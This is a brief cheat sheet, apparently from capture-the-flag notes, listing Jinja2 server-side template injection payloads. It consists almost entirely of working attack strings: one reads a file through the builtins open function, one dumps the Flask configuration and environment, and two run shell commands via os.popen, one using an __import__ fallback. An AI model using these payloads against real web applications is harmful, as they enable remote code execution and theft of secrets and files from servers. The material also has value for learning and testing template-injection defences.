Accessing files via Jinja2 injection is achieved by "walking" the Python object hierarchy to reach the os module or builtins.open. A common payload structure is: 

````
{{ self.__init__.__globals__.__builtins__['open']('flag.txt').read() }}
````


To get the ENV:

````
{{config.items()}}
````


Command exec:

````
{{ self.__init__.__globals__['os'].popen('hostname').read() }}
````


If the os module is not directly in the global namespace, use the built-in import function:


````
{{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('hostname').read() }}
````